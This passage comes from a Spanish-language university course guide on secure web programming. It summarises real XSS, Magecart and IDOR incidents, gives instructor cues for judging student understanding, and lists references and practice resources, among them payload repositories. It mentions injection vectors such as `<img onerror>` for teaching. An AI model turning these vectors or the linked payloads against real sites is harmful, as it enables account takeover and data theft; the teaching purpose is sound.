El primer gusano XSS masivo de la historia de la web. Samy Kamkar inyectó un payload XSS almacenado en su perfil de MySpace que se autorreplicaba: cuando cualquier usuario visitaba su perfil, el gusano se añadía automáticamente al perfil del visitante, propagándose como un virus. En menos de 20 horas, el gusano comprometió más de 1 millón de perfiles de MySpace. MySpace tuvo que desconectar temporalmente la plataforma para limpiar la infección. Fuente: Kamkar, S. (2005). "The MySpace Worm".

---

**4. Ticketmaster — Magecart (2018)**
Mismo vector que British Airways, misma época. Un script de soporte al cliente del proveedor Inbenta fue comprometido por el grupo Magecart. Ticketmaster incluía ese script de Inbenta en sus páginas de pago. El script comprometido actuaba como keylogger, capturando los datos de pago en tiempo real. 40,000 tarjetas de crédito comprometidas. El incidente ilustra el riesgo de la cadena de suministro de software: la vulnerabilidad no estaba en el código de Ticketmaster sino en un proveedor externo de confianza. Fuente: RiskIQ Security Blog, 2018.

---

**5. Instagram — IDOR en mensajes directos de la API privada (2019)**
La API privada de Instagram tenía un endpoint que aceptaba el `user_id` de otro usuario y devolvía sus mensajes directos sin verificar correctamente la relación entre el solicitante y el propietario. Un investigador descubrió que podía leer mensajes privados de cualquier usuario especificando su `user_id` en el request. Esto es un IDOR clásico en una API REST: el parámetro del cliente (user_id) determina el acceso sin verificación server-side de autorización. Recompensa del programa de bug bounty de Instagram/Facebook: $30,000 (una de las más altas pagadas por un IDOR en esa plataforma). Fuente: HackerOne Bug Bounty reports.

---

## EVALUACIÓN FORMATIVA

Indicadores de comprensión que el docente puede observar durante la sesión sin interrumpirla.

---

**Durante el rompe-hielo (INICIO):**
Observar si los estudiantes mencionan espontáneamente "session ID" o "token de sesión" versus solo "contraseña" o "usuario". Los que mencionan session ID tienen conocimiento previo de cookies de sesión. Los que dicen "contraseñas en las cookies" necesitan corrección activa — aprovechar ese momento.

---

**Durante T1 — Mini actividad del `<img onerror>`:**
Los estudiantes que reconocen que `<img onerror>` ejecuta JavaScript sin necesitar la etiqueta `<script>` son los más avanzados del grupo. Los que solo conocen XSS como `<script>alert()>` tienen comprensión básica pero incompleta. Usar esa diferencia para profundizar en la variedad de vectores de inyección.

---

**Durante T3 — Mini actividad de atributos de cookie:**
Nivel básico: identifican 2 atributos faltantes (HttpOnly y Secure — los más conocidos).
Nivel intermedio: identifican 3 (suman SameSite).
Nivel avanzado: identifican los 4 (suman MaxAge/Expires) y también cuestionan la entropía del valor "abc123".
Si la mayoría solo llega a 2, dedicar 2 minutos adicionales a explicar SameSite con un ejemplo de CSRF.

---

**Durante la práctica grupal (HealthTrack):**
Observar qué vulnerabilidad identifica cada grupo primero. Los estudiantes que ven el IDOR primero tienen comprensión más profunda — el IDOR es menos obvio visualmente que el XSS o el SQL. Los que ven solo XSS y SQL pero no el IDOR necesitan andamiaje específico sobre control de acceso. La señal de alarma crítica: si un grupo propone "filtrar las comillas del input" como solución al XSS — esto indica una confusión fundamental entre sanitización de input (poco confiable) y escape de output (la práctica correcta). Intervenir de inmediato: "¿Qué pasa con los comentarios legítimos que incluyen comillas? ¿Y con otros caracteres peligrosos que se te olvide filtrar?"

---

**Durante el cierre — 3 preguntas de síntesis:**
La pregunta 1 (diferencia XSS reflejado/almacenado) funciona como check de comprensión de T1.
La pregunta 2 (atributos de cookie) funciona como check de T3.
La pregunta 3 (cómo corregir IDOR) funciona como check de T4.
Si un estudiante no puede responder la pregunta 2, no dominó T3 y necesita trabajarlo en la guía de trabajo. El docente puede mencionar esto explícitamente: "Si la pregunta 2 les costó, ese es exactamente el ejercicio 3 de la guía de trabajo de esta semana."

---

## REFERENCIAS APA 7

OWASP Foundation. (2021). *OWASP Top Ten 2021*. https://owasp.org/Top10/

OWASP Foundation. (2021). *OWASP Testing Guide v4.2: Testing for Cross Site Scripting*. https://owasp.org/www-project-web-security-testing-guide/

PortSwigger. (2023). *Web Security Academy: Cross-site scripting (XSS)*. https://portswigger.net/web-security/cross-site-scripting

Information Commissioner's Office. (2020). *Intention to fine British Airways £183.39m under GDPR for data breach*. ICO. https://ico.org.uk/about-the-ico/news-and-events/news-and-blogs/2019/07/ico-announces-intention-to-fine-british-airways/

Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (2nd ed.). Wiley. https://www.wiley.com/en-us/9781118026472

HackerOne. (2023). *The 2023 Hacker-Powered Security Report*. https://www.hackerone.com/resources/reporting/the-2023-hacker-powered-security-report

Lam, I. (2021). *Real-world Bug Hunting: A Field Guide to Web Hacking*. No Starch Press.

Congreso de la República del Perú. (2011). *Ley N° 29733, Ley de Protección de Datos Personales*. https://www.minjus.gob.pe/privacidad/

---

## RECURSOS REALES

### Documentación oficial

- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP Session Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- OWASP IDOR Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
- MDN Web Docs — Content Security Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- MDN Web Docs — Set-Cookie (atributos de cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie

### Herramientas gratuitas para práctica

- **OWASP ZAP** (scanner de seguridad web con detección de XSS): https://www.zaproxy.org/
- **XSS Hunter** (plataforma para detectar y demostrar XSS out-of-band): https://xsshunter.trufflesecurity.com/
- **PortSwigger Web Security Academy** (laboratorios gratuitos de XSS, IDOR, Sesiones): https://portswigger.net/web-security
- **DVWA — Damn Vulnerable Web App** (entorno local vulnerable para práctica controlada): https://github.com/digininja/DVWA

### Repositorios GitHub

- **PayloadsAllTheThings** (colección de payloads XSS y IDOR para pentesting): https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- **OWASP WebGoat** (aplicación vulnerable diseñada para aprender seguridad): https://github.com/WebGoat/WebGoat
- **Flask-Security-Too** (extensión Flask con seguridad integrada — sesiones, CSRF, etc.): https://github.com/Flask-Security-Too/Flask-Security

### Videos y recursos complementarios

- PortSwigger — What is XSS? (explicación visual con ejemplos interactivos): https://portswigger.net/web-security/cross-site-scripting
- OWASP AppSec Conference — Broken Access Control talks: https://www.youtube.com/@OWASPGLOBAL
- HackerOne Hacker101 — Free web security training: https://www.hacker101.com/

---

*Documento 1 de 4 — Semana 6 — Programación Segura (DD281) — Universidad Autónoma del Perú — Semestre 2026-1*
